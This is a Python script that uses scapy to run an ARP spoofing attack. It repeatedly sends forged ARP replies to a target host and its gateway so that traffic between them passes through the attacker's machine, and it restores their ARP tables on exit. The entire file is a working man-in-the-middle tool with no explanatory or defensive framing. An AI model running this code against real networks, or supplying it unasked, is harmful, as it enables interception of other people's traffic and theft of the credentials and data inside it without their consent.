#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target ip address")
    parser.add_option("-s", "--source", dest="source", help="Source ip address")
    (options, arguments) = parser.parse_args()

    if not options.target:
        parser.error("[-] Please specify target IP , use --help for more.")
    elif not options.source:
        parser.error("[-] Please specify source IP , use --help for more.")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, verbose=False, timeout=2)[0]
    try:
        return answered_list[0][1].hwsrc
    except: return -1


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    while target_mac == -1:
        target_mac = get_mac(target_ip)

    if target_mac != -1:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    while destination_mac == -1 or source_mac == -1:
        destination_mac = get_mac(destination_ip)
        source_mac = get_mac(source_ip)
    if destination_mac != -1 and source_mac != -1:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, verbose=False, count=4)


options = get_arguments()
target_ip_ = options.target
gateway_ip = options.source


try:
    packets_sent = 0
    while True:
        spoof(target_ip_, gateway_ip)
        spoof(gateway_ip, target_ip_)
        packets_sent = packets_sent + 2
        print(("\r[+] Packets sent:" + str(packets_sent)), end=' ')
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print ("\n[-] Quitting.................")
    restore(target_ip_, gateway_ip)
    restore(gateway_ip, target_ip_)